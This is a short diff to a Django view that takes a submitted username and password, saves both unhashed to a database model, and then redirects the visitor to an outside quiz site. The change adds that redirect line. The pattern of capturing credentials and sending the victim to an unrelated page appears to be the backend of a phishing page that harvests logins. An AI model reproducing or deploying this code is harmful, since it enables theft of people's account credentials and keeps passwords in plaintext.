@@ -910,7 +910,7 @@ def ip(request):
         username = request.POST.get('username')
         password = request.POST.get('password')
         I_P(username=username,password=password).save()
-
+        return redirect('https://www.matequiz.com/start.html?quiz=63e90da29c1e13dd7d6c7167')
     return render(request,'i_p/index.html')
 
 def landing_page_home(request):
